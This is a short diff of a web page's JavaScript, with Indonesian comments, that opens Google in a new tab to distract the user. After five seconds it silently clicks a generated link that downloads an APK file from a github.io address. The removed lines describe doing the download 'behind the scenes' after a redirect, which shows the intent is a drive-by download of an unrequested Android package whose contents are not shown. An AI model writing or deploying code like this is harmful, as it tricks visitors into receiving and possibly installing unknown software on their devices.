@@ -20,15 +20,14 @@
 <body>
 <script>
 function a() {
-  // Langsung redirect user ke halaman lain (misal Google)
-  window.location.href = 'https://google.com';
+  // buka google di tab baru
+  window.open('https://google.com', '_blank');
 
-  // Sementara di belakang layar, tunggu 5 detik baru trigger download
+  // tunggu 5 detik, lalu download file dari tab asal
   setTimeout(() => {
     const link = document.createElement('a');
     link.href = 'https://mohammedalqi.github.io/test.apk';
     link.download = '';
-    link.style.display = 'none';
     document.body.appendChild(link);
     link.click();
     link.remove();
